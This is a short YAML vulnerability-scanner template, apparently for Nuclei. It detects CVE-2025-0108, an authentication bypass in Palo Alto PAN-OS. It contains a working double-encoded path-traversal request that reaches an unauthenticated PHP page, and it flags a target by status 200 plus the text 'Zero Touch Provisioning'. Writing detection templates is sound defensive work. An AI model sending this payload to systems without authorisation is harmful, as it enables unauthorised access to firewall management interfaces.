id: Authentication-Bypass-CVE-2025-0108

info:
  name: Palo Alto PAN-OS Authentication Bypass
  author: YourName
  severity: high
  description: |
    Detects an authentication bypass vulnerability in Palo Alto PAN-OS (CVE-2025-0108).
    The vulnerability allows unauthorized access via a crafted path traversal request.
  reference:
    - https://security.paloaltonetworks.com/CVE-2025-0108
  tags: cve, cve2025, paloalto, panos, auth-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"

    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36

    matchers:
      - type: word
        words:
          - "Zero Touch Provisioning"
        part: body

      - type: status
        status:
          - 200

    matchers-condition: and
